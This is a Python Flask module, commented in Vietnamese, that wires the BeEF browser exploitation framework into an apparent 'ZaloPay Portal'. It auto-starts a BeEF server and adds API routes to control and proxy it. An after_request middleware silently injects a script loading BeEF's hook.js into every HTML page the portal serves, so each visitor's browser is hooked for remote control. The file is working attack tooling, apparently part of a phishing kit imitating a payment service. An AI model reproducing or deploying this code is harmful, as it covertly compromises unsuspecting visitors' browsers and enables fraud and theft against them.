"""
BeEF Integration Module for ZaloPay Portal
Tích hợp BeEF Python vào ZaloPay Portal
"""

import os
import sys
import threading
import logging
import subprocess
from flask import Blueprint, request, jsonify, current_app

# Add BeEF Python path
beef_path = os.path.join(os.path.dirname(__file__), '..', 'beef_python', 'src')
sys.path.insert(0, beef_path)

logger = logging.getLogger(__name__)

beef_integration_bp = Blueprint('beef_integration', __name__)

class BeEFIntegration:
    """
    Lớp tích hợp BeEF vào ZaloPay Portal
    """
    
    def __init__(self):
        self.beef_process = None
        self.beef_server = None
        self.is_running = False
        self.beef_port = 3000
        self.beef_host = '127.0.0.1'
        
    def start_beef_server(self):
        """Khởi động BeEF server trong background thread"""
        try:
            if self.is_running:
                logger.info("BeEF server is already running")
                return True
            
            # Import BeEF components
            from main import create_app
            
            # Create BeEF app
            beef_app, socketio = create_app()
            
            # Start in background thread
            def run_beef():
                try:
                    logger.info(f"Starting BeEF server on {self.beef_host}:{self.beef_port}")
                    socketio.run(
                        beef_app, 
                        host=self.beef_host, 
                        port=self.beef_port, 
                        debug=False,
                        allow_unsafe_werkzeug=True
                    )
                except Exception as e:
                    logger.error(f"BeEF server error: {e}")
                    self.is_running = False
            
            beef_thread = threading.Thread(target=run_beef, daemon=True)
            beef_thread.start()
            
            self.is_running = True
            self.beef_server = beef_app
            
            logger.info("BeEF server started successfully")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start BeEF server: {e}")
            return False
    
    def stop_beef_server(self):
        """Dừng BeEF server"""
        try:
            if self.beef_process:
                self.beef_process.terminate()
                self.beef_process = None
            
            self.is_running = False
            logger.info("BeEF server stopped")
            return True
            
        except Exception as e:
            logger.error(f"Failed to stop BeEF server: {e}")
            return False
    
    def get_beef_status(self):
        """Lấy trạng thái BeEF server"""
        return {
            'running': self.is_running,
            'host': self.beef_host,
            'port': self.beef_port,
            'admin_url': f"http://{self.beef_host}:{self.beef_port}/admin",
            'hook_url': f"http://{self.beef_host}:{self.beef_port}/hook.js"
        }
    
    def inject_hook_to_response(self, response_html):
        """Inject BeEF hook vào HTML response"""
        if not self.is_running:
            return response_html
        
        hook_script = f'''
        <script>
            // BeEF Hook Auto-Injection
            (function() {{
                var script = document.createElement('script');
                script.src = 'http://{self.beef_host}:{self.beef_port}/hook.js';
                script.async = true;
                document.head.appendChild(script);
            }})();
        </script>
        '''
        
        # Inject before closing </head> tag
        if '</head>' in response_html:
            response_html = response_html.replace('</head>', hook_script + '</head>')
        else:
            # If no </head>, inject at the beginning of <body>
            if '<body>' in response_html:
                response_html = response_html.replace('<body>', '<body>' + hook_script)
            else:
                # Last resort: inject at the beginning
                response_html = hook_script + response_html
        
        return response_html

# Global BeEF integration instance
beef_integration = BeEFIntegration()

@beef_integration_bp.route('/beef/start', methods=['POST'])
def start_beef():
    """API endpoint để khởi động BeEF"""
    try:
        success = beef_integration.start_beef_server()
        
        if success:
            return jsonify({
                'success': True,
                'message': 'BeEF server started successfully',
                'status': beef_integration.get_beef_status()
            }), 200
        else:
            return jsonify({
                'success': False,
                'message': 'Failed to start BeEF server'
            }), 500
            
    except Exception as e:
        logger.error(f"Error starting BeEF: {e}")
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

@beef_integration_bp.route('/beef/stop', methods=['POST'])
def stop_beef():
    """API endpoint để dừng BeEF"""
    try:
        success = beef_integration.stop_beef_server()
        
        if success:
            return jsonify({
                'success': True,
                'message': 'BeEF server stopped successfully'
            }), 200
        else:
            return jsonify({
                'success': False,
                'message': 'Failed to stop BeEF server'
            }), 500
            
    except Exception as e:
        logger.error(f"Error stopping BeEF: {e}")
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

@beef_integration_bp.route('/beef/status', methods=['GET'])
def beef_status():
    """API endpoint để lấy trạng thái BeEF"""
    try:
        status = beef_integration.get_beef_status()
        
        return jsonify({
            'success': True,
            'status': status
        }), 200
        
    except Exception as e:
        logger.error(f"Error getting BeEF status: {e}")
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

@beef_integration_bp.route('/beef/proxy/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
def beef_proxy(path):
    """Proxy requests đến BeEF server"""
    try:
        import requests
        
        if not beef_integration.is_running:
            return jsonify({
                'success': False,
                'message': 'BeEF server is not running'
            }), 503
        
        # Forward request to BeEF server
        beef_url = f"http://{beef_integration.beef_host}:{beef_integration.beef_port}/{path}"
        
        # Prepare request data
        headers = dict(request.headers)
        headers.pop('Host', None)  # Remove host header
        
        # Forward request
        if request.method == 'GET':
            response = requests.get(beef_url, headers=headers, params=request.args)
        elif request.method == 'POST':
            response = requests.post(beef_url, headers=headers, json=request.get_json(), params=request.args)
        elif request.method == 'PUT':
            response = requests.put(beef_url, headers=headers, json=request.get_json(), params=request.args)
        elif request.method == 'DELETE':
            response = requests.delete(beef_url, headers=headers, params=request.args)
        
        # Return response
        return response.content, response.status_code, dict(response.headers)
        
    except Exception as e:
        logger.error(f"Error proxying to BeEF: {e}")
        return jsonify({
            'success': False,
            'message': str(e)
        }), 500

def init_beef_integration(app):
    """Initialize BeEF integration với Flask app"""
    try:
        # Register blueprint
        app.register_blueprint(beef_integration_bp, url_prefix='/api')
        
        # Auto-start BeEF server
        beef_integration.start_beef_server()
        
        # Hook injection middleware
        @app.after_request
        def inject_beef_hook(response):
            # Chỉ inject vào HTML responses
            if (response.content_type and 
                'text/html' in response.content_type and 
                beef_integration.is_running):
                
                try:
                    # Get response data
                    response_data = response.get_data(as_text=True)
                    
                    # Inject hook
                    modified_data = beef_integration.inject_hook_to_response(response_data)
                    
                    # Set modified data
                    response.set_data(modified_data)
                    
                except Exception as e:
                    logger.error(f"Error injecting BeEF hook: {e}")
            
            return response
        
        logger.info("BeEF integration initialized successfully")
        
    except Exception as e:
        logger.error(f"Failed to initialize BeEF integration: {e}")

# Context processor để expose BeEF status trong templates
def beef_context_processor():
    """Template context processor cho BeEF"""
    return {
        'beef_status': beef_integration.get_beef_status(),
        'beef_running': beef_integration.is_running
    }

